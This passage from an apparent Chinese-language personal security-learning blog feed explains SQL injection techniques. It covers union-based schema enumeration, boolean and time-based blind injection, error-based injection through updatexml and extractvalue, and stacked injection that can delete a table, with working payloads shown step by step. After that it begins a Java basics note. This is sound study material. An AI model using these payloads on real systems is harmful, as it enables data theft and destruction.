class="hljs-string">&#x27;1&#x27;</span>=<span class="hljs-string">&#x27;1&#x27;</span> -- <span class="hljs-string">&#x27; and password = &#x27;</span>$<span class="hljs-keyword">password</span><span class="hljs-string">&#x27;;</span><br></code></pre></td></tr></table></figure><p>这样就直接可以使 <code>where</code> 条件为<strong>永真</strong>，直接输出 <code>select * from user</code> 的所有内容</p><p><img src="/2024/11/06/TestWP/QL8.png"></p><p><code>order by</code> 判断函数</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">where</span> username = <span class="hljs-string">&#x27;-1&#x27;</span> <span class="hljs-keyword">or</span> <span class="hljs-string">&#x27;1&#x27;</span> = <span class="hljs-string">&#x27;1&#x27;</span> <span class="hljs-keyword">order</span> <span class="hljs-keyword">by</span> <span class="hljs-number">1</span><span class="hljs-comment">-- &#x27; and password = &#x27;$password&#x27;;</span><br><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">where</span> username = <span class="hljs-string">&#x27;-1&#x27;</span> <span class="hljs-keyword">or</span> <span class="hljs-string">&#x27;1&#x27;</span> = <span class="hljs-string">&#x27;1&#x27;</span> <span class="hljs-keyword">order</span> <span class="hljs-keyword">by</span> <span class="hljs-number">2</span><span class="hljs-comment">-- &#x27; and password = &#x27;$password&#x27;;</span><br><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">where</span> username = <span class="hljs-string">&#x27;-1&#x27;</span> <span class="hljs-keyword">or</span> <span class="hljs-string">&#x27;1&#x27;</span> = <span class="hljs-string">&#x27;1&#x27;</span> <span class="hljs-keyword">order</span> <span class="hljs-keyword">by</span> <span class="hljs-number">3</span><span class="hljs-comment">-- &#x27; and password = &#x27;$password&#x27;;</span><br><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">where</span> username = <span class="hljs-string">&#x27;-1&#x27;</span> <span class="hljs-keyword">or</span> <span class="hljs-string">&#x27;1&#x27;</span> = <span class="hljs-string">&#x27;1&#x27;</span> <span class="hljs-keyword">order</span> <span class="hljs-keyword">by</span> <span class="hljs-number">4</span><span class="hljs-comment">-- &#x27; and password = &#x27;$password&#x27;;//报错</span><br></code></pre></td></tr></table></figure><p><img src="/2024/11/06/TestWP/QL9.png"></p><p>库名</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">where</span> username = <span class="hljs-string">&#x27;-1&#x27;</span> <span class="hljs-keyword">or</span> <span class="hljs-string">&#x27;1&#x27;</span> = <span class="hljs-string">&#x27;1&#x27;</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-built_in">schema_name</span>,<span class="hljs-number">2</span> <span class="hljs-keyword">from</span> information_schema.schemata;<span class="hljs-comment">-- &#x27; and password = &#x27;$password&#x27;;</span><br></code></pre></td></tr></table></figure><p><img src="/2024/11/06/TestWP/QL10.png"></p><p>表名</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">where</span> username = <span class="hljs-string">&#x27;-1&#x27;</span> <span class="hljs-keyword">or</span> <span class="hljs-string">&#x27;1&#x27;</span> = <span class="hljs-string">&#x27;1&#x27;</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,group_concat(<span class="hljs-built_in">table_name</span>),<span class="hljs-number">2</span> <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">tables</span> <span class="hljs-keyword">where</span> table_schema=<span class="hljs-keyword">database</span>()<span class="hljs-comment">-- &#x27; and password = &#x27;$password&#x27;;</span><br></code></pre></td></tr></table></figure><p><img src="/2024/11/06/TestWP/QL11.png"></p><p>字段名</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">where</span> username = <span class="hljs-string">&#x27;-1&#x27;</span> <span class="hljs-keyword">or</span> <span class="hljs-string">&#x27;1&#x27;</span> = <span class="hljs-string">&#x27;1&#x27;</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,group_concat(<span class="hljs-built_in">column_name</span>),<span class="hljs-number">2</span> <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">columns</span> <span class="hljs-keyword">where</span> table_schema=<span class="hljs-keyword">database</span>()<span class="hljs-comment">-- &#x27; and password = &#x27;$password&#x27;;</span><br></code></pre></td></tr></table></figure><p><img src="/2024/11/06/TestWP/QL12.png"></p><h1 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h1><p>顾名思义就是服务器不显示查询结果，只返回是否查询成功时，无法使用 union 直接回显数据，需要盲注。盲注有时间盲注和布尔盲注。</p><p>例句</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql">$sql = &quot;<span class="hljs-keyword">SELECT</span> username,<span class="hljs-keyword">password</span> <span class="hljs-keyword">FROM</span> users <span class="hljs-keyword">WHERE</span> id = <span class="hljs-string">&quot;.$_GET[&quot;</span>id<span class="hljs-string">&quot;];</span><br></code></pre></td></tr></table></figure><p>有时候防火墙拦截过滤了 and 但 or 可能没有被过滤拦截，那就可以用 or 来进行盲注</p><h2 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h2><p>比如 id 传参是</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">id</span> <span class="hljs-operator">=</span> <span class="hljs-number">1</span> and <span class="hljs-number">1</span> <span class="hljs-operator">=</span> <span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>执行语句：</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql"><span class="hljs-keyword">select</span> username,<span class="hljs-keyword">password</span> <span class="hljs-keyword">from</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">where</span> id = <span class="hljs-number">1</span> <span class="hljs-keyword">and</span> <span class="hljs-number">1</span> = <span class="hljs-number">1</span>;<br></code></pre></td></tr></table></figure><p><img src="/2024/11/06/TestWP/QL13.png"></p><p>这里要求两个条件为真，一是有 <code>id=1</code>，二是 <code>1=1</code>。</p><p>如果 输入<code>1=2</code>，并不会有回显，返回为空，因为 <code>and</code> 后面的条件并不满足。</p><p>所以可以利用此特点来获取其他信息：</p><h3 id="length-获取长度信息"><a href="#length-获取长度信息" class="headerlink" title="length()获取长度信息"></a><strong><code>length()</code>获取长度信息</strong></h3><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">id</span> <span class="hljs-operator">=</span> <span class="hljs-number">1</span> and length(username) <span class="hljs-operator">=</span> num<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><p>利用 <code>length()</code> 函数爆破数据长度</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql"><span class="hljs-keyword">select</span> username，<span class="hljs-keyword">password</span> <span class="hljs-keyword">from</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">where</span> id = <span class="hljs-number">1</span> <span class="hljs-keyword">and</span> <span class="hljs-built_in">length</span>(username) =<span class="hljs-number">1</span>;<br></code></pre></td></tr></table></figure><p>还可以使用二分</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">id</span> <span class="hljs-operator">=</span> <span class="hljs-number">1</span> and length(username)&lt; num<br><span class="hljs-attribute">id</span> <span class="hljs-operator">=</span> <span class="hljs-number">1</span> and length(username)&gt; num<br></code></pre></td></tr></table></figure><h3 id="SUBSTR-函数截取字符串"><a href="#SUBSTR-函数截取字符串" class="headerlink" title="SUBSTR()函数截取字符串"></a><strong><code>SUBSTR()</code>函数截取字符串</strong></h3><p><code>substr(string,start,length)</code> 参数依次为：要截取字符串，截取开始位置，截取长度。</p><p>比如注入 admin 的 password，构造这样的输入：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">username</span>=&#x27;or substr(password,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>)=&#x27;<span class="hljs-number">1</span>&#x27; #;<br></code></pre></td></tr></table></figure><p>实际 sql 语句：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-keyword">select</span> <span class="hljs-built_in">id</span> from <span class="hljs-built_in">users</span> <span class="hljs-built_in">where</span> username=<span class="hljs-string">&#x27;&#x27;</span> or substr(password,1,1)=<span class="hljs-string">&#x27;1&#x27;</span> <span class="hljs-comment">#;</span><br></code></pre></td></tr></table></figure><p>可以不断改变比较的字符，选取所有可显示字符去遍历，当猜中真正的返回值时，服务器返回用户存在。</p><p>除了截取字符串，还能替换某个字符</p><p>将<code>admin</code> 的第 4 到 6 个字符替换为 ***</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql"><span class="hljs-keyword">update</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">set</span> username = <span class="hljs-built_in">substr</span>(username,<span class="hljs-number">1</span>,<span class="hljs-number">3</span>)||<span class="hljs-string">&#x27;***&#x27;</span>||<span class="hljs-built_in">substr</span>(username,<span class="hljs-number">7</span>) <span class="hljs-keyword">where</span> username = <span class="hljs-string">&#x27;admin&#x27;</span>;<br></code></pre></td></tr></table></figure><p>在不使用联合注入和回显的方式拿到数据</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql"><span class="hljs-keyword">select</span> username,<span class="hljs-keyword">password</span> <span class="hljs-keyword">from</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">where</span> id = <span class="hljs-number">1</span> <span class="hljs-keyword">and</span> <span class="hljs-built_in">substr</span>((<span class="hljs-keyword">select</span> <span class="hljs-keyword">password</span> <span class="hljs-keyword">from</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">where</span> username = <span class="hljs-string">&#x27;admin&#x27;</span>),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>) = <span class="hljs-string">&#x27;a&#x27;</span>;<br></code></pre></td></tr></table></figure><h3 id="MID-函数截取字符串"><a href="#MID-函数截取字符串" class="headerlink" title="MID()函数截取字符串"></a><strong><code>MID()</code>函数截取字符串</strong></h3><p>与 <code>substr()</code>比较像</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">mid</span>(<span class="hljs-string">&quot;butt3rf1y&quot;</span>,<span class="hljs-number">1</span>,<span class="hljs-number">3</span>);// 返回 “but”<br><span class="hljs-attribute">substr</span>(<span class="hljs-string">&quot;butt3rf1y&quot;</span>,<span class="hljs-number">1</span>,<span class="hljs-number">3</span>);// <span class="hljs-string">&quot;but&quot;</span><br></code></pre></td></tr></table></figure><h3 id="CONCAT-函数拼接字符串"><a href="#CONCAT-函数拼接字符串" class="headerlink" title="CONCAT()函数拼接字符串"></a><strong><code>CONCAT()</code>函数拼接字符串</strong></h3><p>可以减少查询跳转次数</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gams"><span class="hljs-function"><span class="hljs-title">concat</span>(<span class="hljs-params">string1,string2,...</span>)</span><br></code></pre></td></tr></table></figure><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">select</span> username,<span class="hljs-keyword">password</span> <span class="hljs-keyword">from</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">where</span> id = <span class="hljs-number">1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> concat(username,<span class="hljs-string">&#x27;-&#x27;</span>,<span class="hljs-keyword">password</span>),<span class="hljs-number">1</span> <span class="hljs-keyword">from</span> <span class="hljs-keyword">user</span>;<br></code></pre></td></tr></table></figure><p><img src="/2024/11/06/TestWP/QL14.png"></p><h2 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h2><p>利用语句执行时间判断真假</p><h3 id="IF-函数"><a href="#IF-函数" class="headerlink" title="IF() 函数"></a><code>IF()</code> 函数</h3><p>判断指定条件是否成立，根据结果返回不同的值</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli"><span class="hljs-keyword">if</span><span class="hljs-params">(condition,value_if_true,value_if_false)</span>;<br><br><span class="hljs-string">//</span> <span class="hljs-literal">true</span>:条件成立时要返回的值<br><span class="hljs-string">//</span> <span class="hljs-literal">false</span>:条件不成立时要返回的值<br></code></pre></td></tr></table></figure><h3 id="SLEEP-函数"><a href="#SLEEP-函数" class="headerlink" title="SLEEP()函数"></a><code>SLEEP()</code>函数</h3><p>程序执行时，会暂停指定秒数</p><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-function"><span class="hljs-title"><span class="hljs-built_in">sleep</span></span>(<span class="hljs-variable">seconds</span>)</span><br></code></pre></td></tr></table></figure><p>比如</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs csharp"><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> user <span class="hljs-keyword">where</span> username = <span class="hljs-string">&#x27;admin&#x27;</span> <span class="hljs-function"><span class="hljs-keyword">and</span> <span class="hljs-title">if</span>(<span class="hljs-params">sleep(<span class="hljs-number">5</span></span>),1,0)</span>;<br><br><span class="hljs-comment">//如果不存在用户名为 admin 的用户，语句将立即返回结果，否则暂停 5s 再返回结果</span><br></code></pre></td></tr></table></figure><p>延时函数 <code>SLEEP()</code> 或 <code>BENCHMARK()</code> 函数来判断是否注入成功</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">select</span> username,<span class="hljs-keyword">password</span> <span class="hljs-keyword">from</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">where</span> id = <span class="hljs-number">1</span> <span class="hljs-keyword">and</span> <span class="hljs-keyword">if</span>(ASCII(substr(username),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>))=<span class="hljs-number">97</span>,sleep(<span class="hljs-number">5</span>),<span class="hljs-number">0</span>);<br><br>// 如果用户表中的第一个用户名字符为字母 a，则程序会暂停 <span class="hljs-number">5</span>s,否则返回 <span class="hljs-number">0</span><br></code></pre></td></tr></table></figure><h3 id="BENCHMARK-函数"><a href="#BENCHMARK-函数" class="headerlink" title="BENCHMARK()函数"></a><code>BENCHMARK()</code>函数</h3><p>用于重复执行指定语句</p><p>（重复执行次数，重复执行语句）</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">benchmark</span><span class="hljs-params">(count,expr)</span></span><br></code></pre></td></tr></table></figure><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">where</span> username = <span class="hljs-string">&#x27;admin&#x27;</span> <span class="hljs-keyword">and</span> <span class="hljs-keyword">if</span>(benchmark(<span class="hljs-number">10</span>,md5(<span class="hljs-string">&#x27;butt3rf1y&#x27;</span>)),<span class="hljs-number">1</span>,<span class="hljs-number">0</span>);<br><br>// 如果数据库中不存在用户名为 <span class="hljs-keyword">admin</span> 的用户，那么该语句将会立即返回；否则，程序将会重复执行 md5(<span class="hljs-string">&#x27;butt3rf1y&#x27;</span>) 函数 <span class="hljs-number">10</span> 次后再返回结果<br></code></pre></td></tr></table></figure><h3 id="时间戳"><a href="#时间戳" class="headerlink" title="时间戳"></a>时间戳</h3><p><strong><code>unix_timestamp()</code> 函数</strong></p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs csharp"><span class="hljs-keyword">select</span> username,password <span class="hljs-keyword">from</span> user <span class="hljs-keyword">where</span> id = <span class="hljs-number">1</span> <span class="hljs-function"><span class="hljs-keyword">and</span> <span class="hljs-title">if</span>(<span class="hljs-params">unix_timestamp</span>)&gt;1382772838,<span class="hljs-title">sleep</span>(<span class="hljs-params"><span class="hljs-number">5</span></span>),0)</span>;<br><br><span class="hljs-comment">//如果当前时间戳大于 1382772838,则程序会暂停 5s,否则返回 0</span><br></code></pre></td></tr></table></figure><h3 id="函数返回值"><a href="#函数返回值" class="headerlink" title="函数返回值"></a>函数返回值</h3><p>利用函数返回值判断是否注入成功</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql"><span class="hljs-keyword">select</span> username,<span class="hljs-keyword">password</span> <span class="hljs-keyword">from</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">where</span> id = <span class="hljs-number">1</span> <span class="hljs-keyword">and</span> <span class="hljs-keyword">if</span>(<span class="hljs-built_in">length</span>(username)=<span class="hljs-number">4</span>,sleep(<span class="hljs-number">5</span>),<span class="hljs-number">0</span>);<br></code></pre></td></tr></table></figure><h1 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h1><p>通过报错获取信息</p><h2 id="updatexml-函数"><a href="#updatexml-函数" class="headerlink" title="updatexml()函数"></a><code>updatexml()</code>函数</h2><p>用于更新 xml 格式数据</p><p>（要更新的 xml 数据，要更新的节点路径，更新的节点值）</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">updatexml</span><span class="hljs-params">(xml_target,xpath_expr,new_value)</span></span><br></code></pre></td></tr></table></figure><p>这个函数有一个缺陷，如果二个参数包含<strong>特殊符号</strong>时会报错，并且会第二 个参数的内容显示在报错信息中</p><p>比如</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">select</span> username,<span class="hljs-keyword">password</span> <span class="hljs-keyword">from</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">where</span> id = <span class="hljs-number">1</span> <span class="hljs-keyword">and</span> updatexml(<span class="hljs-number">1</span>,<span class="hljs-number">0x7e</span>,<span class="hljs-number">3</span>);<br><br>会报错：XPATH syntax error: <span class="hljs-string">&#x27;~&#x27;</span><br></code></pre></td></tr></table></figure><p>所以可以用 <code>concat()</code> 函数将查询语句和特殊符号拼接在一起</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">select</span> username,<span class="hljs-keyword">password</span> <span class="hljs-keyword">from</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">where</span> id = <span class="hljs-number">1</span> <span class="hljs-keyword">and</span> updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,version()),<span class="hljs-number">3</span>);<br><br>// XPATH syntax error: <span class="hljs-string">&#x27;~8.0.40&#x27;</span><br></code></pre></td></tr></table></figure><p><code>updatexml()</code>有长度限制，可以用 <code>limit()</code>和<code>substr()</code> 函数</p><p><strong><code>limit()</code> 函数</strong></p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">select</span> username,<span class="hljs-keyword">password</span> <span class="hljs-keyword">from</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">where</span> id = <span class="hljs-number">1</span> <span class="hljs-keyword">and</span> updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span> username <span class="hljs-keyword">from</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">limit</span> <span class="hljs-number">1</span>,<span class="hljs-number">1</span>)),<span class="hljs-number">3</span>);<br><br>//可以不断改变 <span class="hljs-keyword">limit</span> num,<span class="hljs-number">1</span> 的值逐行获取<br></code></pre></td></tr></table></figure><p><img src="/2024/11/06/TestWP/QL15.png"></p><p><strong><code>substr()</code>函数</strong></p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">select</span> username,<span class="hljs-keyword">password</span> <span class="hljs-keyword">from</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">where</span> id = <span class="hljs-number">1</span> <span class="hljs-keyword">and</span> updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,substr((<span class="hljs-keyword">select</span> group_concat(username) <span class="hljs-keyword">from</span> <span class="hljs-keyword">user</span>),<span class="hljs-number">1</span>,<span class="hljs-number">31</span>)),<span class="hljs-number">3</span>);<br><br>// XPATH syntax error: <span class="hljs-string">&#x27;~admin,ctf,test,flag,user&#x27;</span><br></code></pre></td></tr></table></figure><p>获得所有数据库</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">select</span> username,<span class="hljs-keyword">password</span> <span class="hljs-keyword">from</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">where</span> id = <span class="hljs-number">1</span> <span class="hljs-keyword">and</span> updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-string">&#x27;~&#x27;</span>,substr((<span class="hljs-keyword">select</span> group_concat(<span class="hljs-built_in">schema_name</span>) <span class="hljs-keyword">from</span> information_schema.schemata), <span class="hljs-number">1</span> , <span class="hljs-number">31</span>)),<span class="hljs-number">3</span>);<br><br>// XPATH syntax error: <span class="hljs-string">&#x27;~mysql,information_schema,perfor&#x27;</span><br></code></pre></td></tr></table></figure><p>获取所有表</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">select</span> username,<span class="hljs-keyword">password</span> <span class="hljs-keyword">from</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">where</span> id = <span class="hljs-number">1</span> <span class="hljs-keyword">and</span> updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-string">&#x27;~&#x27;</span>,substr((<span class="hljs-keyword">select</span> group_concat(<span class="hljs-built_in">table_name</span>) <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">tables</span> <span class="hljs-keyword">where</span> table_schema = <span class="hljs-string">&#x27;mysql&#x27;</span>),<span class="hljs-number">1</span>,<span class="hljs-number">31</span>)),<span class="hljs-number">3</span>);<br><br>//XPATH syntax error: <span class="hljs-string">&#x27;~columns_priv,component,db,defau&#x27;</span><br></code></pre></td></tr></table></figure><p>获取所有字段</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">select</span> username, <span class="hljs-keyword">password</span> <span class="hljs-keyword">from</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">where</span> id = <span class="hljs-number">1</span> <span class="hljs-keyword">and</span> updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-string">&#x27;~&#x27;</span>,substr((<span class="hljs-keyword">select</span> group_concat(<span class="hljs-built_in">column_name</span>) <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">columns</span> <span class="hljs-keyword">where</span> table_schema = <span class="hljs-string">&#x27;mysql&#x27;</span> <span class="hljs-keyword">and</span> <span class="hljs-built_in">table_name</span> = <span class="hljs-string">&#x27;db&#x27;</span>),<span class="hljs-number">1</span>,<span class="hljs-number">31</span>)),<span class="hljs-number">3</span>); <br><br>// XPATH syntax error: <span class="hljs-string">&#x27;~Host,Db,User,Select_priv,Insert&#x27;</span><br></code></pre></td></tr></table></figure><h2 id="EXTRACTVALUE-函数"><a href="#EXTRACTVALUE-函数" class="headerlink" title="EXTRACTVALUE()函数"></a><code>EXTRACTVALUE()</code>函数</h2><p>从 XML 格式的数据中提取指定节点的值</p><p>（要提取节点值的 XML 数据，要提取的节点路径）</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">extractvalue</span><span class="hljs-params">(xml_target,xpath_expr)</span></span><br></code></pre></td></tr></table></figure><p>报错和 <code>updatexml()</code> 函数一样，使用也差不多，但是少一个参数 x</p><h1 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h1><p> 一堆 SQL 语句 (多条) 一起执行方法</p><p>在执行 SQL 语句时，如果 SQL 语句中包含多个 SQL 语句，数据库服务器会依次执行这些 SQL 语句，从而导致多次 SQL 注入攻击（感觉有点小像爆破）。通过在 SQL 语句中使用分号（;）来分隔多个 SQL 语句，从而实现堆叠注入攻击。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> users;<span class="hljs-keyword">show</span> databases; <br></code></pre></td></tr></table></figure><p>堆叠注入可以执行的是<strong>任意</strong>的语句。</p><p>比如用户输入：1; DELETE FROM products </p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql"><span class="hljs-keyword">Select</span> * <span class="hljs-keyword">from</span> products <span class="hljs-keyword">where</span> productid=<span class="hljs-number">1</span>;<span class="hljs-keyword">DELETE</span> <span class="hljs-keyword">FROM</span> products<br></code></pre></td></tr></table></figure><p>当执行查询后，第一条显示查询信息，第二条则将整个表进行删除</p><p>并不是每一个环境都适合堆叠注入，且在堆叠前还需要知道一些信息才能正常注入。</p><p>只是一些常见的注入类型，以后在学习过程中还会遇到新知识，到时候再补充嘻嘻~~~</p>]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
      <category>SQL 注入</category>
      
    </categories>
    
    
    <tags>
      
      <tag>SQL</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Java 基础</title>
    <link href="/2024/11/09/Java/"/>
    <url>/2024/11/09/Java/</url>
    
    <content type="html"><![CDATA[<p>一些学习 Java 的笔记，篇幅有点长嘻嘻 ^__^ ~</p><span id="more"></span><h1 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h1><h2 id="八大数据类型"><a href="#八大数据类型" class="headerlink" title="八大数据类型"></a>八大数据类型</h2><h6 id="数值型"><a href="#数值型" class="headerlink" title="数值型"></a>数值型</h6><p>​1.整数类型（byte,short,int,long）</p><p>​2.浮点类型（float,double）</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">long</span> <span class="hljs-variable">num</span> <span class="hljs-operator">=</span><span class="hljs-number">30L</span>;<span class="hljs-comment">// long 型加 L</span><br><span class="hljs-type">float</span> <span class="hljs-variable">num1</span> <span class="hljs-operator">=</span> <span class="hljs-number">50.1F</span>;<span class="hljs-comment">// float 型加 F</span><br></code></pre></td></tr></table></figure><h6 id="字符型（char）2个字节"><a href="#字符型（char）2个字节" class="headerlink" title="字符型（char）2个字节"></a>字符型（char）2个字节</h6><h6 id="布尔型（boolean）"><a href="#布尔型（boolean）" class="headerlink" title="布尔型（boolean）"></a>布尔型（boolean）</h6><h2 id="引用数据类型"><a href="#引用数据类型" class="headerlink" title="引用数据类型"></a>引用数据类型</h2><p>类（class） 